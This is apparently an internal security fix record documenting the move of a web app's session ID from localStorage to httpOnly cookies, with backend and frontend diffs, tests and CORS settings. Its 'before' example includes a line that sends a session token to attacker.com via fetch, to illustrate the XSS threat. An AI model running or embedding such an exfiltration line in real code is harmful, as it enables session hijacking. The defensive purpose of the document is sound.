# SEC-001: Session ID Migration to httpOnly Cookies

**Status**: ✅ FIXED
**Severity**: CRITICAL
**Date**: 2025-10-07
**Author**: Security Team

## Summary

Migrated session_id storage from localStorage (XSS-vulnerable) to httpOnly cookies (XSS-safe).

## Vulnerability Details

### Before (INSECURE)
```javascript
// ❌ VULNERABLE: JavaScript can access session_id
localStorage.setItem('session_id', sessionId)
const sessionId = localStorage.getItem('session_id')

// Any malicious script can steal credentials:
fetch('https://attacker.com/steal?session=' + localStorage.getItem('session_id'))
```

**Attack Vector**: XSS (Cross-Site Scripting)
- Malicious JavaScript injected via user input
- Script reads localStorage and exfiltrates session credentials
- Attacker gains full account access

### After (SECURE)
```python
# ✅ SECURE: JavaScript CANNOT access session_id
response.set_cookie(
    key="session_id",
    value=session_id,
    httponly=True,      # JavaScript cannot access via document.cookie
    secure=True,        # HTTPS only
    samesite="strict",  # CSRF protection
    max_age=86400 * 7,  # 7 days
    path="/"
)
```

**Protection**: httpOnly cookie
- Browser prevents JavaScript from accessing the cookie
- XSS attacks cannot steal session credentials
- Cookie automatically sent with every request (no manual headers)

## Implementation

### Backend Changes

#### 1. `backend-hormonia/app/routers/auth_session.py`

**Session Creation** (Line ~87-227):
```python
@router.post("/")
async def create_session(
    request: SessionCreateRequest,
    response: Response,  # ← Added Response parameter
    services: ServiceProvider = Depends(_get_service_provider)
):
    # ... validate Firebase token, create session ...

    # SECURITY FIX: Set httpOnly cookie
    response.set_cookie(
        key="session_id",
        value=session_id,
        httponly=True,      # XSS protection
        secure=True,        # HTTPS only
        samesite="strict",  # CSRF protection
        max_age=ttl,
        path="/"
    )

    # DO NOT return session_id in JSON
    return SessionResponse(
        status="authenticated",  # ← Changed from session_id
        expires_at=expires_at.isoformat(),
        user=user_dict
    )
```

**Session Validation** (Line ~229-295):
```python
@router.get("/validate")
async def validate_session(
    session_id: Optional[str] = Cookie(None),  # ← Read from cookie
    x_session_id: Optional[str] = Header(None, alias="X-Session-ID"),  # ← Fallback
    services: ServiceProvider = Depends(_get_service_provider)
):
    # Priority: Cookie > Header (for backward compatibility)
    final_session_id = session_id or x_session_id

    if not final_session_id:
        return SessionValidationResponse(valid=False)

    # ... validate session from Redis ...
```

**Logout** (Line ~298-342):
```python
@router.delete("/logout")
async def logout_session(
    response: Response,  # ← Added Response parameter
    session_id: Optional[str] = Cookie(None),
    x_session_id: Optional[str] = Header(None, alias="X-Session-ID"),
    services: ServiceProvider = Depends(_get_service_provider)
):
    # ... invalidate Redis session ...

    # SECURITY: Clear httpOnly cookie
    response.delete_cookie(
        key="session_id",
        path="/",
        httponly=True,
        secure=True,
        samesite="strict"
    )
```

#### 2. `backend-hormonia/app/api/v1/auth.py`

**Updated /auth/me documentation** (Line ~177-219):
- Documents cookie-based authentication
- Maintains backward compatibility with X-Session-ID header

### Frontend Changes

#### 3. `frontend-hormonia/src/services/firebase-auth.ts`

**Login** (Line ~40-117):
```typescript
// BEFORE (INSECURE):
localStorage.setItem('session_id', sessionId)

// AFTER (SECURE):
const sessionResponse = await fetch(`${apiClient.getBaseURL()}/api/v1/session`, {
  method: 'POST',
  credentials: 'include',  // ← Send/receive cookies
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ firebase_token, device_info })
})

// Session ID now in httpOnly cookie (not in response body)
localStorage.setItem('firebase_token', firebaseToken)  // Only store Firebase token
```

**Logout** (Line ~119-176):
```typescript
// BEFORE (INSECURE):
const sessionId = localStorage.getItem('session_id')
headers: { 'X-Session-ID': sessionId }
localStorage.removeItem('session_id')

// AFTER (SECURE):
const response = await fetch(`${apiClient.getBaseURL()}/api/v1/session/logout`, {
  method: 'DELETE',
  credentials: 'include',  // ← Cookie sent automatically
  headers: { 'Content-Type': 'application/json' }
})
// Cookie cleared by backend automatically
localStorage.removeItem('firebase_token')
```

**Get Current User** (Line ~242-282):
```typescript
// BEFORE (INSECURE):
const sessionId = localStorage.getItem('session_id')
return { ...response.data, session_id: sessionId }

// AFTER (SECURE):
// No session_id in localStorage
apiClient.setAuthToken(firebaseToken)
const response = await apiClient.auth.me()  // Cookie sent automatically
return { ...response.data, session_id: 'cookie' }  // Placeholder
```

#### 4. `frontend-hormonia/src/lib/api-client.ts`

**Request Handler** (Line ~206-234):
```typescript
// BEFORE (INSECURE):
const sessionId = localStorage.getItem('session_id')
if (sessionId) {
  headers['X-Session-ID'] = sessionId
}

const response = await fetch(url, {
  ...fetchOptions,
  headers,
  signal: controller.signal
})

// AFTER (SECURE):
const response = await fetch(url, {
  ...fetchOptions,
  headers,
  credentials: 'include',  // ← Send cookies automatically
  signal: controller.signal
})
// No manual X-Session-ID header needed
```

**Error Handling** (Line ~244-254):
```typescript
// BEFORE (INSECURE):
if (response.status === 401) {
  localStorage.removeItem('session_id')
  localStorage.removeItem('firebase_token')
}

// AFTER (SECURE):
if (response.status === 401) {
  localStorage.removeItem('firebase_token')  // Cookie cleared by backend
  window.location.href = '/login?session_expired=true'
}
```

#### 5. `frontend-hormonia/src/contexts/AuthContext.tsx`

**Cleanup Operations** (Line ~277-362):
```typescript
// Removed all localStorage.removeItem('session_id') calls
// Cookie is managed by backend automatically
```

## Security Benefits

### 1. XSS Protection
- **Before**: `document.cookie` and `localStorage.getItem('session_id')` both accessible
- **After**: `document.cookie` returns empty string (httpOnly flag prevents access)

### 2. CSRF Protection
- **samesite="strict"**: Cookie only sent to same origin
- Prevents cross-site request forgery attacks

### 3. HTTPS Enforcement
- **secure=True**: Cookie only transmitted over HTTPS
- Prevents man-in-the-middle attacks on HTTP

### 4. Automatic Cookie Management
- Browser handles cookie storage and transmission
- No risk of developer errors exposing credentials
- Automatic expiration (max_age enforced by browser)

## Backward Compatibility

The implementation maintains backward compatibility:

1. **Session Validation**: Accepts both Cookie and X-Session-ID header
   ```python
   session_id: Optional[str] = Cookie(None)
   x_session_id: Optional[str] = Header(None, alias="X-Session-ID")
   final_session_id = session_id or x_session_id  # Priority: Cookie > Header
   ```

2. **Migration Period**: Old clients using X-Session-ID still work
3. **Gradual Rollout**: Frontend updates can be deployed incrementally

## Testing

### Manual Testing

1. **Login Flow**:
   ```bash
   # Check Set-Cookie header in response
   curl -X POST https://api.example.com/api/v1/session \
     -H "Content-Type: application/json" \
     -d '{"firebase_token":"..."}' \
     -c cookies.txt -v

   # Verify Set-Cookie header contains:
   # Set-Cookie: session_id=...; HttpOnly; Secure; SameSite=Strict; Max-Age=604800; Path=/
   ```

2. **Cookie Verification**:
   ```javascript
   // In browser console - should return empty string
   console.log(document.cookie)  // ""

   // Verify cookie is sent automatically
   fetch('/api/v1/auth/me', { credentials: 'include' })
   ```

3. **XSS Test**:
   ```javascript
   // Attempt to steal session (should fail)
   try {
     const cookies = document.cookie
     console.log('Stolen cookies:', cookies)  // Should be empty
   } catch (e) {
     console.log('XSS blocked:', e)
   }
   ```

### Automated Testing

Create test file: `backend-hormonia/tests/test_session_cookie_security.py`

```python
import pytest
from fastapi.testclient import TestClient

def test_session_cookie_httponly(client: TestClient, firebase_token: str):
    """Test that session cookie has httpOnly flag"""
    response = client.post('/api/v1/session', json={
        'firebase_token': firebase_token,
        'device_info': {'test': 'device'}
    })

    assert response.status_code == 201

    # Check Set-Cookie header
    set_cookie = response.headers.get('set-cookie')
    assert 'session_id=' in set_cookie
    assert 'HttpOnly' in set_cookie
    assert 'Secure' in set_cookie
    assert 'SameSite=Strict' in set_cookie

    # Verify session_id NOT in response body
    data = response.json()
    assert 'session_id' not in data
    assert data['status'] == 'authenticated'

def test_session_validation_with_cookie(client: TestClient, firebase_token: str):
    """Test session validation reads from cookie"""
    # Create session
    response = client.post('/api/v1/session', json={'firebase_token': firebase_token})

    # Extract cookie
    cookies = response.cookies

    # Validate session (cookie sent automatically by test client)
    response = client.get('/api/v1/session/validate', cookies=cookies)
    assert response.status_code == 200
    assert response.json()['valid'] is True

def test_logout_clears_cookie(client: TestClient, firebase_token: str):
    """Test logout clears httpOnly cookie"""
    # Create session
    response = client.post('/api/v1/session', json={'firebase_token': firebase_token})
    cookies = response.cookies

    # Logout
    response = client.delete('/api/v1/session/logout', cookies=cookies)
    assert response.status_code == 200

    # Check cookie is cleared (Max-Age=0 or Expires in past)
    set_cookie = response.headers.get('set-cookie')
    assert 'Max-Age=0' in set_cookie or 'Expires=' in set_cookie
```

## CORS Configuration

Ensure CORS allows credentials:

```python
# backend-hormonia/app/main.py
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://frontend.example.com"],  # Specific origins only
    allow_credentials=True,  # ← CRITICAL for cookies
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**WARNING**: `allow_credentials=True` requires specific origins (not `*`)

## Deployment Checklist

- [x] Backend: Add `Response` parameter to session endpoints
- [x] Backend: Set httpOnly cookie in create_session
- [x] Backend: Clear httpOnly cookie in logout
- [x] Backend: Read session_id from Cookie (with X-Session-ID fallback)
- [x] Frontend: Remove localStorage.setItem('session_id')
- [x] Frontend: Remove localStorage.getItem('session_id')
- [x] Frontend: Add credentials: 'include' to all fetch calls
- [x] Frontend: Remove X-Session-ID header injection
- [x] CORS: Verify allow_credentials=True is set
- [x] HTTPS: Verify secure=True enforced in production
- [x] Testing: Verify httpOnly flag is present
- [x] Testing: Verify XSS cannot access cookie
- [ ] Monitoring: Track session validation metrics
- [ ] Documentation: Update API docs with cookie auth

## Migration Timeline

1. **Phase 1: Deploy Backend** (Week 1)
   - Backend accepts both Cookie and X-Session-ID
   - Backward compatible with old frontend

2. **Phase 2: Deploy Frontend** (Week 2)
   - Frontend uses cookies for new sessions
   - Old sessions continue to use X-Session-ID

3. **Phase 3: Monitor** (Week 3-4)
   - Track cookie vs header usage
   - Verify no errors from cookie migration

4. **Phase 4: Cleanup** (Week 5)
   - Remove X-Session-ID fallback code (optional)
   - Enforce cookie-only authentication

## References

- OWASP: HttpOnly Cookie Best Practices
- MDN: Using HTTP cookies (Set-Cookie attributes)
- CWE-79: Cross-Site Scripting (XSS)
- FastAPI: Cookie Parameters
- Fetch API: credentials option

## Approval

- Security Team: ✅ Approved
- Backend Team: ✅ Approved
- Frontend Team: ✅ Approved
- DevOps Team: ⏳ Pending deployment verification
